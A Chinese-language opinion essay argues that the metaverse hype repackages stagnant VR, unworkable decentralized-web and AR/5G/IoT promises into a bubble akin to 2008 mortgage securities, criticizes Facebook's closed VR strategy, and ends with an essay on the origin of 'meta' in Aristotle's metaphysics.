本文共 19572 字，大约需要阅读 35~50 分钟。先上结论，我们认为： 元宇宙=2010 年代的过时技术风口+1990 年代的复古科幻概念+08 年次贷危机般的金融创新。 元宇宙中无创新 扶不上墙的 VR 去网上搜一下，你会发现不同机构画的行业图谱差异巨大，但他们都有一个特征：囊括了过去 5 年吞噬了大量融资，但市场化失败的技术。 VR 几乎是这一特征的代表性技术，其次是去中心互联网，其它的后面我们也会稍稍谈到。 以扎克伯格为代表的“元宇宙”新贵，纷纷把 VR 视作 metaverse 的入口。尽管在演讲和 PPT 中留下了“其它设备也可以接入”的后手，但有“沉浸感”这个大前提摆在前面， VR 对元宇宙的重要性，毋庸置疑。 如今提起 VR，许多人的直观印象不外乎就是“昂贵”和“眩晕”，以及“复杂”衍生的“吃灰”。自从 2016“VR元年”的泡沫破灭之后，整个 VR 行业马上陷入了缓步增长苟且偷生的过冬状态；那么，在这种状态下撑过五年苟活至今的主流VR产品，真能撑起画饼大过天的“元宇宙”吗？ 答案并不乐观。 首先要明确一点，从 VR 由热转冷的五年时间里，诸如“VR 眩晕”以及“VR成本高昂”的唱衰论调，都属于典型的以讹传讹： 之所以会有那么多人抱怨 VR 让自己天旋地转，原因不外乎就是一上来接触了粗制滥造的 VR 手机盒子、连接 VR 设备的 PC 配置不足导致画面卡顿掉帧、用站姿而非坐姿进行体验以及早期 VR 设备确实存在的舒适度缺陷（后文详述）； 至于硬件成本，在过去 5 年更是随着 VR 一体机的普及不断下跌，如今的主流 VR设备，入手价格已经和非旗舰的主流中端手机相差无几，且无需高配 PC 也可以独立运行，使用与沉没成本大大降低。 但即便如此，凭借现如今的主流 VR 硬件水平，想要胜任“元宇宙入口”的重任，依旧是力有不逮的：想象一下，一个 500 克左右的塑料盒子紧紧箍在眼前、几乎所有的重量都压在颧骨上方、密不透风的盒子散发的所有热量都被厚厚的海绵聚拢在双眼周围的感觉吧——无处排遣的闷热让人头晕脑胀，汗水淋漓的朦胧视野更是让所有提升分辨率的努力付诸东流。 从五年前开始，这种丝毫谈不上惬意的体验就彻底败坏了 VR 产业的声誉，诸如“显示分辨率不足制约 VR 发展”以及“VR 必晕”一类以讹传讹的论调，就此流行起来。 不仅如此，在最基本的产品设计方面，现如今的主流 VR 设备，和 5 年前的主流 VR 产品相比，基本形态几乎可以用“原地踏步”甚至开倒车来形容： 这是 2021“元宇宙元年”的代表性 VR 设备——Facebook（现在应该叫 Meta 了）出品的 Oculus Quest 2； 这是开启 2016“VR元年”的主流VR设备——Facebook 收购并出品的第一代消费级VR头显套装，Oculus Rift。 暂且不论外接配件，单从我们能接触到的部分来看，一个密不透风的塑料盒子+两个环形外轮廓的无线手柄，这就是从五年前到现在，主流 VR 厂商带给我们的一切——至于实际体验，基本就是用遥控电视机的姿势悬腕操作两个鼠标，灵活度尚可，准确度需要适应，便捷性远没有看上去那么自如，疲劳值倒是涨得飞快。 没错，2021 年的新一代产品确实包含了手势追踪机能，但如果这种解放双手的操作真有那么好用，为何还要标配两个无线控制器？答案不言而喻。 这还远远不是重点，更大的问题在于，尽管连接 PC 的 VR 设备作为演示机在 2016 年成功吸引了不少投资者的目光，但在意识到 2016 年的主流 PC 配置很难兼顾 VR 体验的画质与流畅度、C 端用户想要玩得爽必须砸钱升级 PC 硬件的事实之后，相当一部分 VR 厂商放弃了 PC，选择了除去便宜一无是处的手机 VR 盒子路线，创造出了“直接把移动平台芯片封进 VR 外壳”的所谓“VR 一体机”——这股潮流一直延续到了今天，2021 年标榜“元宇宙入口”的主流 VR 设备，基本都是这个调调。 显而易见，哪怕是和同时期的主流 PC 平台相比，主流移动芯片的运算和图形性能都不在一个量级上；然而，尽管从最基础的画面帧率到攸关互动体验的空间定位性能全面劣化，凭借便宜的优势以及卖力的宣发推动，VR 一体机依旧占据了消费端市场，成为了 VR 行业的新主流。 在这种劣币驱逐良币的大趋势下，“尽快追平 2016VR 元年树立的产品标杆”变成了这些主流 VR 厂商的最高任务；时隔五年之后，这些尚未被淘汰的 VR 一体机厂商，终于用捉襟见肘的预算和各种取舍，在一个全面缩水的硬件平台上，勉强实现了五年前 PC 平台 VR 设备的基础功能： 五年前的 Oculus Rift，拥有 1080 x 1200 的单眼分辨率、90Hz 的标准屏幕刷新率外加精度不错的 Outside-in 六自由度空间定位系统； 五年后现如今的 Oculus Quest 2，拥有 1832 x 1920 的单眼分辨率、90Hz的常规屏幕刷新率，外加只要不超出摄像头范围那效果就还可以的 Inside-out 六自由度空间定位系统； 与此同时，五年的时间并没有让 Oculus Quset 2 实现理想中的轻量化，超过 500 克的机身重量甚至比470克出头的初代产品表现更糟； 而在瞳间距调节这种攸关舒适度的细节上，Oculus Quest 2 的表现同样比不过五年前的初代主流VR设备，至于发热这种只有体验过才会叫苦不迭的头号难题，只能说，和 Oculus Quest 2 短暂的续航时间算是绝配。 然而，即便做出了这么多的取舍，最终成功实现“成本控制”单一目标的主流 VR 一体机，依旧远远算不上能让业界满意的硬件平台——举个最直接的例子，对于那些不得不转投 VR 一体机的内容开发者来说，他们不得不降低自己作品的视觉效果甚至压缩删减内容来满足这个瘸腿平台的性能需求。最终，这种削足适履的局面，导致了两个十足黑色幽默的结果： 一方面，尽管收买过不止一家内容团队砸下过大笔资金，时至今日，Oculus Quest 2真正有资格做为招牌吹嘘一下的VR游戏，只有《Beat Saber》一款而已；为了彰显自家 VR 平台前景远大，Facebook 甚至还收买了一批经典但上市至少也有十年的游戏IP，计划用不止一份 VR 冷饭壮大声势——Meta “元宇宙”的始发平台要靠这种陈年把戏来撑场面，真不知是可笑还是可悲。 另一方面，即便凭借低廉的价格吸引了一批萌新，但作为 VR 一体机，Oculus Quest 2 孱弱的性能外加并不丰厚的游戏阵容，并没有让热度维持在理想的高度上——最终，玩家手中的 Oculus Quest 2 要么吃灰遇冷，要么就是被用户彻底抛弃“移动VR”的无用噱头，连上 PC 去玩 SteamVR 的游戏。兜兜转转绕了一大圈，最后还是回到了五年前的起点，也算是一种轮回。 总之，整整重复造了 5 年轮子，且 5 年后的主流轮子，还真不一定比 5 年前的主流轮子更出色更好用，这就是承载“元宇宙”入口重任的 VR 产业面临的现状——而对于“元宇宙”来说，这还远远不是麻烦的全部。 掩耳盗铃的去中心互联网 五年的发展换来寥寥无几的迭代进步，作为独立终端，VR 一体机显然跟不上“元宇宙”新贵们的画饼力度；为了避免作茧自缚的歧路技术拖自己野心的后腿，新贵们高调打出了“分布式”的底牌，仿佛只要把“元宇宙”化整为零，一切麻烦都可以自动解决。 由于区块链技术和加密数字货币市场的火热，去中心网络几乎成为元宇宙行业图谱中第二重要的一项应用。当然还有一个原因是，如今已更名为 meta 的 Facebook 公司曾在 2019 年宣布了其去中心数字加密货币项目 Libra。这是世界上第一个如此大规模的商业公司在数字加密货币领域的尝试。 与去中心的加密数字货币不同，去中心互联网给了人们另一个许诺：用户将获得对自己网络行为和财产的完全控制权，我们每个人都将拥有真正属于自己而非被算法、平台和资本操控的互联网世界。 哦，听上去真是太棒了。 幻想类作品当中有个叫 Phlebotinum 的概念，简单来说就是不管逻辑原理，遇上问题找它就能通通解决——《沙丘》的美琅脂（香料）和《星球大战》的原力都是这种东西。那么，这种虚构作品里的便宜事，在真实世界当中能不能成立呢？ 很遗憾，2021 虽然是个充满魔幻色彩的年份，但它的基调依旧是冷冰冰的现实：去中心化的加密数字货币短期内也许不会死，但摆脱传统资本+主权控制的去中心化互联网短期内也实现不了。 比特币网络从 2008 年开始，已经稳定运行了13年。尽管有许多主权国家先后尝试过摧毁比特币网络，但从未成功。 然而这种分布式金融网络的成功，基于金融应用本身对网络资源的低消耗。众所周知，用最最简化的逻辑来描述：去中心意味着冗余，冗余意味着成倍的消耗资源和成本，而成倍的成本意味着对资本更大的依赖而不是更少。 说的详细一点，目前，普通的，可民用的非金融性分布式网络分为两个路径，一部分是纯粹的分布式网络，比如 ZeroNet、I2P 和 IPFS 等。这种模式下，构建一个网络应用的全部技术都需要分布式，包括存储、计算与传输。在另一种模式下，比如使用以太坊构建的一系列 Web 应用，这些应用仅对关键技术进行分布式以试图解决一些中心化网络的问题。 这两种模式分别面临两种不同的发展困境，我们先来否定第二种，第二种的本质就是掩耳盗铃。在中国 Web 3 圈有一个非常恶毒的鲁棒性测试，就是一个 Web 3 应用不管吹的多么天花乱坠，唯一检测它是否靠谱的方法，就是把它举报到网信办，看看它是否会因为涉黄涉政被封掉。 在这种测试，或类似的监管情况下，第二种模式是不堪一击的。 因为传统主权国家和商业机构对互联网应用的控制，遍及互联网技术的每一个链条。除非你将应用的构建、数据的存储、云计算、分发以及用户的每日触达的每个环节都分布式，那么你的分布式应用就没有任何意义。 比如使用以太坊似乎可以逃避主权国家关于支付和金融监管的各项规定，但是上如果你的交易量足够大，你的域名、服务器等非中心化的部分就会被查封，你的公司实体就会被关闭，你自身甚至会因为违反证监会或 SEC 的相关规则而锒铛入狱。 以上例子并不针对中国，在美国和任何监管完备的国家同样适用。 相比之下，第一种似乎更能实现分布式网络本来的诉求——创造真正由每个用户个体自己所控制的互联网。 然而，这种模式的难点是，既然它完全被用户所控制，意味着它完全依赖用户的资源来构建，因此易用性极低。 我们以微博为例，知乎上曾有人推算微博在 2011 年全年生产的数据为 370T（知乎问题：新浪微博每天几亿用户产生上万G信息是怎么储存的？），这一数字在进入视频时代之后有爆炸性增长，但我没能找到更新的数字，因此我们就以 2011 年的数字来计算。 尽管看起来这个数字对于一家互联网企业来说并不算大，但对于普通用户来说仍是一个天文数字。 如果我们要以纯粹分布式的技术构建一个微博，这意味着我们需要在用户端存储这 370T 的数据。并且是以复数的形式存储，因为我们不能保证用户是实时在线的。 为了保证这 370T 的数据随时可被任何地理位置、任何时区的用户访问，每条数据可能要至少在 100 个 用户那里被存储，因为与 24 小时高质量在线的中心化数据中心不同，用户可能随时离线。这意味着，即便这份数据被 100 个用户存储，任何一个时间点可访问到的数据源可能也只有其中的 10 个。 那么，存储需求会迅速膨胀到 100 倍，也就是 37000T。 考虑到根本不可能有普通用户会贡献出 370T 的存储空间，因此实际的情况是每份完整数据，大概需要被存储在 740 个愿意贡献出 512G 空间的用户那里。这意味着想要稳健的以分布式存储这一年份的微博数据（100 倍容错），需要至少 74,000 十分慷慨的做种用户。 而实际上，这还只考虑了存储的问题。还记得经典版微博遇到的最大困境是什么嘛？是明星出轨时的扩容问题，也就是带宽与计算性能问题。 由于目前主流的民用宽带均为不对等带宽，实际上 74,000 个普通用户所提供的上传带宽，根本不可能满足微博用户日常的浏览需求，也就是说这些数据虽然被安全的存储了，却不能被实时预览。体现在用户体验上，就是这个分布式微博的“卡顿”和“炸”将成为日常。 事实上，分布式的微博一直存在于上文举例的 ZeroNet、I2P 和 IPFS 中。但由于易用性问题，即便是在 Tumblr 扫黄和川普卸任时引发的百万人卸载 Twitter 这种大规模的“数字迁徙”中，普通用户也绝不会选择这些易用性差但“真正属于自己”的互联网应用。 他们只会从一个中心化的坑，跳进另一个中心化的坑。 因为实践证明，互联网应用的易用性才是互联网普及的真正原因，如果互联网为了某种哲学或意识形态上的执着而降低易用性，那么大多数人的选择只会是“不用”。 回到去中心互联网与元宇宙的关系上，去中心互联网自己所遇到的这些问题，在元宇宙中可以被解决吗？ 不可以。 甚至恰恰相反，元宇宙中精致的模型，海量的数据和庞大的计算量都会要求更加集中化成本更低的云形态，这一点与 Web 3 所能解决的完全相反。 推出的 Libra 在经历了几次白皮书修改和更名后，至今也处于难产状态。与它的 VR 业务一样，属于“你做的很好，但不要算进估值哦”的业务。 元宇宙是找不到出路的技术合集 元宇宙技术之坑，何止是 VR 与分布式网络。 要估测这个坑究竟有多深，首先，我们要找一张元宇宙行业图谱出来，看看除了上文提到的两个节点之外，还有哪些技术被包进了元宇宙概念里。 除了 VR 和分布式网络这两个产品形态最明确，槽点也最详细的概念技术之外，在目前的元宇宙技术图谱上，其它相对没那么清晰的技术和概念节点，基本可以分为两个类型：其一是类似 Phlebotinum 的画饼，其二是根本不能自洽的忽悠。 首先是 Phlebotinum 类。正如前文介绍，这个概念基本可以理解为“万金油”，也就是不必纠结细节，一经启用立刻解决一切麻烦的技术玄学——除了前面提过的分布式网络，“元宇宙”技术图谱上的 Phlebotinum 节点，还包括这些： “有 AR 就好了，AR 好了，元宇宙就好了”； “有 5G 就好了，5G 好了，元宇宙就好了”； “有物联网就好了，物联网好了，元宇宙就好了”。 一条一条来。首先是 AR，不可否认，这项技术确实是目前所有移动终端厂商的必争之地，在过去的五年当中，不管是 iOS 还是 Android，全球所有能够影响市场的手机厂商，都在这个领域投入了大量资源进行布局，不仅仅是开发套件和应用环境，产品原型同样屡见不鲜——然而，时至今日，真正投放市场且产生过实际影响力的穿戴式民用 AR 设备有多少？ 答案是 0。 直到今天，提起穿戴式 AR 设备，大多数人的第一印象依旧是起步崩殂的 Google Glass，偶尔还能想起挂羊头卖狗肉结果沦为笑柄的 Snapchat Spectacles，真正能够被 C 端用户——哪怕仅仅是小众市场——接受的穿戴式 AR 设备到底应该是什么模样，谁都不清楚。 唯一可以确认的是，过去不止五年的时间里，“苹果即将推出 AR 眼镜”属于年年必有年年落空的谣言，“所有厂商都在等待苹果打响第一枪”同样是心照不宣的传说，至于什么时候落地，大概是“下次一定”吧。 而这种落空是必然的，因为如果你打开几年前吹 AR 的报告看一下，那里面的行业图谱会涉及不止一个现阶段消费技术领域难以突破的关键节点。这些技术的演进，可能会以 10 年为单位缓慢进步，而按照产业树的演进思路，那些基础技术即便是有了突破，也会在几十年后才会影响到元宇宙。 然后是 5G。相比于画饼多年的 AR，5G 的落地效率明显要高得多，但时至今日，在 C 端市场 5G 网络究竟能有什么价值，争议依旧没有停止——“5G 拯救 VR 行业”乃至“5G 开启 AR 时代”的论调之所以会甚嚣尘上，显而易见，这些属于未来的愿景最适合用 Phlebotinum 买单。 但必须指出，暂且不提八字还没一撇的穿戴式 AR 设备，即便已经实现了理想中的 5G 网络覆盖率，现阶段的 VR 终端能有多大进步，依旧存疑——就在今年年初，Google 宣布关闭 Stadia 第一方内容工作室，曾经被创投圈寄予厚望、认为有潜力开启“云游戏”新时代的 Google Stadia，沦落为平台方自己都不看好前途的第三方线上商店。 和之前的消费级 AR 眼镜一样，Google的努力再次浅尝辄止，至于下一位寄希望于云端的选手能不能用 5G 和 AR 以及 VR 在“元宇宙”创造奇迹，不妨拭目以待。 最后让我们看看物联网。和元宇宙已知的 Phlebotinum 画饼相比，物联网在这个技术图谱上的形象几乎是最模糊的，翻来覆去就是“虚实共生”“链接万物”之类的片儿汤话，但问题在于，以“元宇宙”新贵的标准来看，将现实世界屏蔽在外营造出的沉浸式体验，才是元宇宙的“meta”真正的价值所在； 所以说，强调“现实连接”的物联网，对于强调数字化沉浸的“元宇宙”来说，又有什么意义呢？ 目前最符合逻辑的答案，恐怕得等到“元宇宙”的疆域扩展到 AR 领域才能揭晓——这样一来，等于是又回到了最开始的“AR 好了，元宇宙就好了”，又轮到 Phlebotinum 买单了。 除了这些乍看前途无量实则净是空谈的 Phlebotinum 技术节点，在现阶段的“元宇宙”蓝图上，不符合逻辑甚至自相矛盾的愿景丝毫不鲜见，例如沉浸：一方面，沉浸感是元宇宙的核心价值所在，另一方面，达到预期的沉浸感，导致沉迷怎么办？ 时至 2021 年，对互联网沉迷，或者互联网对我们生活“包裹”的反抗与管制已经不再是中国的特色。在西方社会关于降低屏幕时间、降低社交产品成瘾性和对数字公司免费产品征收额外税费的讨论，并不比中国家长要去关停游戏的呼声低。 不允许沉迷，所以要降低沉浸感？那还要元宇宙干什么，互联网不香吗？ 不允许缩水沉浸感，所以放松对沉迷的监管？那按照“元宇宙”新贵的逻辑，某位国产科幻大户已经写好了咱们的未来： “未来的虚拟世界确实是天堂，在那里面每个人确实是上帝，其美妙是任何想象都难以企及的。我只想像一下那时的现实世界。开始，现实中的人会越来越少，虚拟天堂那么好，谁还愿意呆在苦逼的现实中，都争相上载自己。地球渐渐变成人烟稀少的地方，最后，现实中一个人都没有了，世界回到人类出现前的样子，森林和植被覆盖着一切，大群的野生动物在自由地漫游和飞翔……只是在某个大陆的某个角落，有一个深深的地下室，其中运行着一台大电脑，电脑中生活着几百亿虚拟人类。” ——《不能共存的节日》，刘慈欣 当然，肯定也有人想到了《头号玩家》电影的结尾，用“定时断网”的强制手段来避免沉迷——但是，既然我们投入了这么多，最终造出的是一个极有可能让全人类万劫不复的数字敌托邦，干嘛不在一开始就避免这种搬起石头砸自己的脚的闹剧？互联网还有现实宇宙真的不够香吗？ 最后的最后，如果一定要挑出现阶段“元宇宙”技术蓝图最大的逻辑问题，那么显而易见——真正的“元宇宙”，根本就不该让Faceook这种寡头来创造。 无论是《雪崩》还是《玩家一号》，这些为“元宇宙”新贵的愿景PPT提供了展现素材的科幻作品，都包含着一个相同的内核： 和崩溃边缘的糟糕现实相比，流光溢彩的虚拟世界才是躲避一切苦难的归宿；至于这片乐土的创造者，则是一群偏执到近乎鲁莽、相比于盈利更重视内容素质的怪胎，再加上无数认同这些怪胎的Geek。 正是凭借这些不认钱的开拓者付出的不懈努力，门槛极低但沉浸感史无前例的Metaverse（来自《雪崩》）和绿洲（来自《玩家一号》） 才得以正式上线，进而彻底改变了整个互联网和人类社会的形态。 那么问题来了，如果创造“元宇宙”的不再是一群不看重利润只重视用户体验的技术怪胎，最终的结果又会如何呢？ 他们要“绿洲”玩家按月缴费，在每个角落设置广告，让用户的隐私和言论自由成为过去式。一旦IOI接手这个游戏，那么“绿洲”将不再是我童年的乌托邦。它会成为垄断企业运营的反乌托邦世界，阔佬们才玩得起的主题公园。 ——《头号玩家》，恩斯特·克莱恩 IOI 的原型是什么，所有人心知肚明。结果到头来，这些反派背后的原型托拉斯跳出来，彻底无视了技术层面的困难与短板，号称要在现实世界中创造原本只存在于虚拟世界中的“元宇宙”——实话实说，放在 2021 这个魔幻现实主义大年，倒也不是什么预料之外的展开。 好了，让我们总结一下吧： 元宇宙的终端入口——主流VR产品难堪大用，主流AR设备八字没一撇，两条腿都是瘸的。 元宇宙的网络架构——分布式网络撑不起这种规模的数据交换量，退而求其次放弃去中心化，等同于剥除了元宇宙的自由本质这个核心卖点。 元宇宙的网络基建——5G更适合AR主场，对VR的意义相对有限，物联网也是一个道理。另外，云技术不是元宇宙的救世主，看看云游戏就懂。 元宇宙的基本逻辑——沉浸感和沉迷互斥，目前无解。 元宇宙的基本立场——目前炒作这个概念的“元宇宙”新贵，在 PPT 上呈现的产品，和他们展示理念所引用的科幻作品原型从根本上就是两个概念；确实存在符合元宇宙开拓者身份立场的游戏公司，但他们对目前的“元宇宙”潮流没兴趣，唯一沾点边的实际行动，就是在自家平台上封掉了包含 NFT 和区块链内容的游戏。 只会比基底宇宙更差的元宇宙 好了，关于“元宇宙”的技术探讨，到这里先暂时告一段落；那么，从逻辑和伦理的角度出发，由虚拟现实技术编织出的“元宇宙”，真会是比现实世界更美好的数字化应许之地吗？ 我们曾在《Metaverse: 谁要我们跑步进入环形监狱》一文中描述过这个问题。 简单来说，与一个上帝并不存在或已经许久不发挥神迹的基底宇宙相比，存在上帝的元宇宙更令人感到可怕。 现实世界中无论是资本还是政治还是你相信的任何影响世界的神秘力量，在其发力的时候都受到熵的制约。 也就是任何限制、治理、管制，或者你不管叫它好的还是坏的强制力，都存在执行效率的问题。 比特币之所以能在全球主要国家联合剿杀的情况下运行这么多年，是基于一种灰度治理平衡，即现代主权国家无论如何真的很难管控所有曾经下载过比特币钱包的用户。因此，它实际上不能管控一个自然人使用比特币，只能管控一个经济人或法律人使用比特币。也就是各国会不断推出基于比特币与法币之间的交易监管政策，这本质是在管理自己国家的法币而不是在监管比特币。 现实世界中的现代社会虽然一直被法律与规则所拘束，但由于执法效率的问题我们始终处于一种灰度的治理平衡状态。 立法者无论如何也要考虑到，并不是所有的法律和规则都能被严格的精确执行，这既为犯罪者带来了侥幸心理，也为普通人留有人性的空间。 但这个灰度治理平衡，在元宇宙中是另一番景象。 在由企业或国家或任何单一组织控制的元宇宙中，“上帝”同时存在于元宇宙中和我们的基底宇宙中。这意味着，立法者与执法者将透过在基底宇宙中的“有限权利”获得元宇宙中至高无上的绝对权利它，无论他是谁，将拥有控制一个“宇宙”物理常数与规则的能力。 以最最简单的一则网络礼仪来举例。 现实世界中的法律无法规定“骂人者死刑”其实并不是因为骂人不值得死刑，而是因为以人类当今的技术，是无法实时监控到谁在骂人并进行取证的。但这件事在赛博空间里早有实现，屡次骂人者被禁言或删号从 BBS 时代就是网络通行规则。 但如果我们将一个人的账号视为一个人的数字孪生， 将元宇宙视为如 Shaan Puri 所说的“元宇宙是一个活得更有价值的虚拟世界”，这是不是意味着，“屡次骂人者封号”实际是一项“骂人者死刑”的严酷且可执行的法律？ 这样的剧本，其实在过去已经上演过一遍——没错，远在 2021“元宇宙”潮流到来之前，那些早早吞下 VR 技术果实的新贵，垄断统治虚拟世界的野心，早已经暴露无遗。 2014年，时年 24 岁的 Palmer Luckey，接受了 20 亿美元的报价（后来扎克伯格确认，成本实际为 30 亿美元），将自己创立的 VR 品牌 Oculus 打包卖给了 Facebook。考虑到这宗收购的时间点以及交易金额，从那一刻开始，一直到 2016 年，Oculus 以及背后的 Facebook，都被创投媒体普遍认为“抓住了通向未来的钥匙”。 ——直到 2016“VR 元年”正式到来，舆论形势急转直下。 整整拖延了半年的发货，高昂到离谱的定价，直接让 Oculus Rift 这个“VR 元年”的开启者，变成了2016年最大的输家； 随后，Oculus 的创始人 Palmer Luckey 被 Facebook 扫地出门，John D. Carmack，以及 Michael Abrash，这些曾被寄予厚望用 VR 再次改变世界的计算机图形学泰斗人物，逐渐被 Facebook 边缘化，Oculus Rift 代表的高性能 PCVR 路线，逐渐被 Oculus Quest 系列代表的中低端廉价“移动VR”产品路线取而代之。 改变的不仅仅是硬件。在被 Facebook 收购之前，Palmer Luckey 明确表示，Oculus 的产品路线图不能偏离“开放”和“包容”的原则，正因如此，早在 Oculus DK2 开发者套件流行的时候，就有民间 Geek 实现了“手机+移动电源+DK2 头显”的 DIY 模式——换句话来说，正是这种拓展性极强的开放形态，才创造出了“VR 一体机”最初的产品原型。 然而，在 Facebook 接手 Oculus 之后，开放包容的仪态荡然无存——沿用手机产品思路创造的“VR 一体机”自然不用多提，软件方面，从 2016 年开始 Facebook 就给 Oculus Rift 筑起了独占软件的垄断墙，即便同为必须连接 PC 的 VR 设备，即便和其它厂商的同期产品相比并无优势，甚至连内容本身也毫无亮点，想要体验这些鸡肋独占内容，额外的预算投入几乎是在所难免的。 事实上，由于 Facebook 实在是做得太绝，早在 2016 年的时候，VR 玩家社区就出现了一家名叫 Revive 的组织，旨在用技术手段打破 Facebook 的内容垄断墙，让其它 PCVR 玩家也能正常体验这些徒有其表的 Oculus 平台独占 VR 游戏（当然游戏本身还是必须由玩家购买的，Revive 并不是破解组织）。这种罗宾汉式的义举得到了 VR 玩家和媒体的广泛认同，甚至连 Oculus 的创始人 Palmer Luckey 在 2017 年被 Facebook 扫地出门之后，都对 Revive 表示了明确的支持。 但无论如何，这些明确的反对意见和行为，并没有改变 Facebook 的 VR 产品路线。从软件到硬件，利用垄断封闭的产品构筑的 VR 囚笼，依旧是扎克伯格理想中的 VR 美丽新世界： 然而，事实证明，抛弃了“开放性”的沃土，单凭垄断企业的一己之力想要主宰全人类的 VR 未来世界，显然没那么容易——太远的不提，早在 2017 年的 Oculus Connect 大会上，扎克伯格就亲自站台宣传过自家的 VR 社交平台，Oculus Venues： 顺带一提，这是本款 Facebook 第一方VR社交应用在官方商店的人气，以及产品现状： 当然，扎克伯格的 VR 社交野心铁定不会浅尝辄止。除了 Venues，Facebook 还推出过 Spaces 这种尬聊式VR应用，同样是扎克伯格本扎亲自站台宣传： 然后这款应用被喷上了天——媒体舆论纷纷表示，套着没有下半截躯干、形似手指布偶的卡通化身，身临其境地钻进全景拍摄的飓风灾害现场，用事不关己的轻佻语气点评灾情并把这一切录下来发到网上炫耀，简直彻底突破了做人的道德底线，自知理亏的扎克伯格乖乖道歉。 总之，Spaces 这款一上线就丢人现眼的 Facebook 第一方 VR 社交应用，现状如下： 什么？你说这就是元宇宙概念要拉上分布式网络，避免落入任何单一实体控制的原因？那请你回到上两节，去看看泥菩萨过江的 Web 3。 尾声：元宇宙何以成为风口？ 是的，经历过了漫长的论证，我们终于来到了这一轮元宇宙浪潮的核心环节，也就是元宇宙为什么会成为媒体和投资的“风口”。 在上文中，我们已经通过分析证明，这一轮作为风口的“元宇宙”中，所有的技术和概念都是陈旧的。 ——但其实，甚至连这一轮风口的制作手法和金融操作，同样是陈旧的。 元宇宙中的每一项技术，在过去 5 年各自的垂类媒体里都已经是陈词滥调，我们甚至找不到一些这些技术的新“黑点”，因为他们实际上在过去5 年里毫无可以拿出来说的进步。 但当这些技术被打包成了一个名为元宇宙的新概念，就立刻成了风投、企业和媒体界的宠儿。这恰似是引发 2008 年美国金融危机的住房抵押贷款证券，本质是一堆必然暴雷的债权合集，但绑在一起就成为了 AAA 级理财产品。 一级市场投资和证券市场投资的逻辑不尽相同，风险投资的逻辑写在它的名字里，同时承担风险和追求回报是它的宿命。也正因如此，一级市场中的投资组合筛选才显得尤为重要。 但“元宇宙”并不是一个清晰的赛道，它本身就是一个投资组合，投资元宇宙在某种程度上是投资机构的一种消极怠工。元宇宙能够获得如此大规模的资本关注，本质上是资本对寻找真正有长期成长价值的投资标的已没有兴趣，只想把钱扔进一个稳健的理财组合里，而这个理财组合甚至不是由他们自己建立的。 反过来说，被包括在“元宇宙”行业图谱中的技术，任何一个技术的单点突破带来的收益都是巨大的。如果投资机构对这些技术有信心，那完全不必将这些技术包装为元宇宙的一环。比如在元宇宙概念技术中的多项涉及硬件的技术都与便携性相关，那么数码设备便携性的基础障碍之一是电池。如果人类的电池技术没有奇点临近式的突破，很难想象能够真的制造出一种比智能手机在便携与功能体验上更平衡的设备。 按照这个逻辑，电池也是元宇宙概念技术了，难怪新能源涨得这么疯。 然而，之所以资本不再关注单点技术，是因为处于元宇宙行业图谱中的这些单点技术都在过去的一段时间里被证明了具有不可逾越的应用障碍或技术缺陷。但已经投进去的钱，又不能收回来。 所以，就只能打包成光鲜亮丽的“衍生概念”卖给 new money 了。 这其中还有另外一个助推的因素，即传统金融市场在疫情大背景下的失能。 自疫情开始不久之后，全球主要金融市场都开始出现与实体经济背离的繁荣景象。但这一轮的繁荣有其关键特征，即资金迅速向公众认为不会因疫情倒闭的头部高科技公司集中。 这种资金抱团的现象，在某种程度上使得其它类别、其它量级的公司在二级市场上变得困难。对于传统 VC 来说，这意味着他们的投资退出通道变得更加狭窄了——“如果我投资的企业，受到疫情影响没能上市，或是上市价格较低怎么办？” 答案就是抱团。 既然二级市场中资金抱团了，那么不如让投资标的也抱团。 与 new money 联手打造全新概念，并借此机会推动自己手中无缘上市也无缘市场化的陈旧项目和技术专利被 FANNG 和 BAT 溢价收购。前者退出套现，后者拉高股价，最终再由二级市场中的投资人埋单。 这一路径，也许从 Oculus 被收购的时候开始就已经是注定的，唯一的因素是疫情加速了这一过程。 尽管本文全文以 Facebook 为例批判了元宇宙热炒的虚火，但希望读者能够认清，元宇宙赛道中的资本玩家远不止 Facebook 一个。 他们甚至不远在大洋彼岸。 后话：“元”到底是个什么？ 既然“元宇宙”仅仅是一群互联网新贵燃起的虚火，那么，“元”到底是不是骗局？ 在说完了本文的主要观点之后，我们不妨从头开始讨论一下“元”（Meta）的意义与价值。 特别提示：本段附录试图给那些从没玩过元游戏，或者只是简单接触过元游戏的读者讲讲元游戏，乃至“Meta（元）”的醍醐味，为此不可避免地涉及※大※量※剧※透※ 。如果您本身还有尝试这些经典老牌元游戏的愿望，建议略过此节不读。 好啦，让咱们开始吧—— 元叙事与形而上学 “我过去学过古典文学，‘meta’这个词来源于希腊语，意思是‘超越’。对我而言，它象征着总有更多的东西要去构建，总有下一章的故事。” 关于“元”也就是“Meta”的定义，上周的开发者大会第一天，扎克伯格在《创始人的信》当中做出了以上说明——考虑到这个解释基本等于“听君一席话，如听一席话”，咱们还是自力更生找答案吧： 首先，有请一位咱们所有人都不陌生的希腊老熟人 ——无错，亚里士多德。 和一辈子输出只靠一张嘴的苏格拉底不同，搞学问十项全能的亚里士多德，一辈子留下的典籍数量，用“著作等身，且不止一身”来形容丝毫不为过。不难想象，面对茫茫多的学术遗产，亚里士多德的后继者，着实为归档问题纠结了好久： 和古典时期的许多聪明人一样，亚里士多德的兴趣方向非常复杂，哪怕在看似相近的类别下，莫名其妙的主题也是层出不穷——例如，那些研究“身边事物”的著作里，既有“构成事物的物质”这种看得到摸得着的议题，也有“事物是个什么事物 ”这种纯粹基于想象的“本元问题”研究——先把分类命名搞定，显然属于当务之急。 大约在公元前1世纪的时候，雅典逍遥学派的后继者之一、罗德岛的安德罗尼库斯，把亚里士多德对“身边事物”的研究，总结成了两个分类： 其中一类，研究有形体的事物，被称作 physics——翻译过来，就是“物理”； 另一类，研究没有形体的事物，被称作 metaphysics——看，meta出现了！ 顺带一提，metaphysics 的正式译名咱们应该都不陌生，就是形而上学。 由此可见，从文化和史学的角度来看，“meta”并不是什么诞生于信息时代的前卫概念；以形而上学为例，从古典到中世纪再到文艺复兴，这门从全局角度探讨“生命、宇宙以及一切”的“本质”学问，在整个西方哲学史上都占据着举足轻重的地位： 从笛卡尔到康德，再从黑格尔到休谟，在以世纪为单位的岁月里，大批载入史册和教科书的哲人，都在这门“meta”学术的发展史上，留下了自己思辨的痕迹。 不过，在迭代版本持续更新的同时，形而上学究竟“meta”出了什么结论，争议的声音也在逐渐泛起；终于，随着实证主义的崛起，并没有给出“生命、宇宙以及一切”终极答案的形而上学被推下神坛——“用孤立、静止、片面的观点看世界”，这种咱们耳熟能详的形而上学定义，源头之一就是这里。 